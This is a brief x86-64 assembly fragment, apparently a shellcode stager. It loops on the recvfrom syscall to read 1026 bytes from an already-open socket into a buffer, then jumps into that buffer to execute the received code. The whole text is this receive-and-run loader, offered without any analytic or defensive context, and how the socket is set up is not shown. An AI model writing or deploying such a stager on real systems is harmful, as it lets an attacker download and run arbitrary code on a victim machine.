// buf
mov rsi, r12
mov r14, 1026

again:
mov rdi, r13
mov rdx, r14
mov r10d, 0
xor r8d, r8d
xor r9d, r9d
mov eax, 45 ;// recvfrom
syscall
add rsi, rax
sub r14, rax
test r14, r14
jnz again

jmp r12
